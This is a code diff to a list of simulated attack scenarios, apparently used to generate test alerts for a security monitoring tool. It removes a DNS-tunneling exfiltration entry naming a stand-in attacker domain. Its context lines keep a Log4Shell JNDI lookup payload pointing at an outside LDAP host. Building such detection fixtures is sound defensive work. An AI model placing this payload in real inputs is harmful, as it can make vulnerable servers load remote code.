@@ -92,20 +92,6 @@ ATTACK_SCENARIOS = [
         "severity": "CRITICAL",
         "risk_score": 98,
         "raw_event": {"jndi_payload": "${jndi:ldap://185.220.101.5:1389/Exploit}", "cve": "CVE-2021-44228"}
-    },
-    {
-        "name": "[6. POST-COMPROMISE] DNS Tunneling Data Exfiltration",
-        "description": "Base64 chunked database dump exfiltration over DNS TXT queries",
-        "src_ip": "10.240.20.88",
-        "src_port": 53000,
-        "dst_ip": "45.33.32.10",
-        "dst_port": 53,
-        "protocol": "DNS",
-        "signature": "ET POST_COMPROMISE Data Exfiltration Over DNS Tunnel (Base64 Chunked)",
-        "category": "post_compromise",
-        "severity": "CRITICAL",
-        "risk_score": 97,
-        "raw_event": {"bytes_exfiltrated": 15400000, "domain": "exfil.attacker-dns.org"}
     }
 ]
 
